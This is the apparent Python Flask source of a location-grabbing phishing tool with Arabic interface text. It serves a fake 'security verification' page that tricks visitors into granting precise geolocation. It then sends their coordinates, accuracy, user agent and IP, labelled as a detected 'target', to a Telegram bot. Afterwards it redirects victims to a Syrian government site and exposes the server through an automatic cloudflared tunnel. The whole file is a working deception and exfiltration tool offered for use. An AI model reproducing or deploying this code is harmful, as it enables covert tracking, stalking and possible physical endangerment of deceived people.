import os
import subprocess
import time
import base64
import json
import requests
import re
from flask import Flask, request, render_template_string

app = Flask(__name__)

# إعدادات الألوان والملفات
RED, GREEN, CYAN, YELLOW, END = '\033[91m', '\033[92m', '\033[96m', '\033[93m', '\033[0m'
CONFIG_FILE = ".env_config.json"
LOG_FILE = "captured_intelligence.txt"

def get_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f: return json.load(f)
    print(f"{CYAN}⚙️ إعدادات التلجرام:{END}")
    token = input(f"{YELLOW}  [>] Bot Token: {END}").strip()
    chat_id = input(f"{YELLOW}  [>] Chat ID: {END}").strip()
    config = {"token": token, "chat_id": chat_id}
    with open(CONFIG_FILE, "w") as f: json.dump(config, f)
    return config

config = get_config()
TELEGRAM_TOKEN = config["token"]
CHAT_ID = config["chat_id"]

def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})
    except: pass

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>بوابة التحقق الأمني</title>
    <style>
        body { font-family: Arial; background: #0b0e14; color: white; text-align: center; padding: 50px; }
        .card { background: #151921; max-width: 400px; margin: auto; padding: 30px; border-radius: 12px; border: 1px solid #232933; }
        .btn { background: #1a73e8; color: white; padding: 15px; border: none; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <h2>نظام الاستعلام الموحد</h2>
        <p>يجب السماح بالوصول للموقع للتأكد من النطاق الجغرافي القانوني.</p>
        <button class="btn" onclick="grab()">بدء التحقق</button>
    </div>
    <script>
        function grab() {
            navigator.geolocation.getCurrentPosition(p => {
                // فك تشفير البيانات وإضافة بصمة كشف التزييف
                let isMock = (p.coords.accuracy <= 1) ? "⚠️ مشبوه (دقة ثابتة)" : "✅ حقيقي";
                let d = {
                    lat: p.coords.latitude, 
                    lon: p.coords.longitude, 
                    acc: p.coords.accuracy, 
                    mock: isMock,
                    ua: navigator.userAgent
                };
                fetch('/log?d=' + btoa(JSON.stringify(d))).then(() => {
                    alert("تم التحقق.");
                    window.location.href = "https://moi.gov.sy";
                });
            }, () => alert("الإذن مطلوب."), {enableHighAccuracy: true});
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML_TEMPLATE)

@app.route('/log')
def log():
    d_enc = request.args.get('d')
    if d_enc:
        data = json.loads(base64.b64decode(d_enc).decode('utf-8'))
        map_url = f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
        
        # التقرير الاستخباراتي مع كشف التزييف
        report = (
            f"🎯 *تم رصد هدف جديد*\n\n"
            f"📍 *الموقع:* [فتح الخريطة]({map_url})\n"
            f"🛡️ *حالة الموقع:* {data['mock']}\n"
            f"📡 *الدقة:* {data['acc']} متر\n"
            f"🌐 *IP:* `{request.remote_addr}`"
        )
        send_to_telegram(report)
        print(f"{GREEN}[+] تم الإرسال للتلجرام بنجاح!{END}")
    return "OK"

if __name__ == "__main__":
    # تشغيل Cloudflared آلياً
    subprocess.Popen("cloudflared tunnel --url http://127.0.0.1:8080 > tunnel.log 2>&1", shell=True)
    time.sleep(8)
    with open("tunnel.log", "r") as f:
        url = re.findall(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', f.read())
        if url: print(f"{GREEN}🔗 الرابط الفعال: {url[0]}{END}")
    app.run(host='0.0.0.0', port=8080)
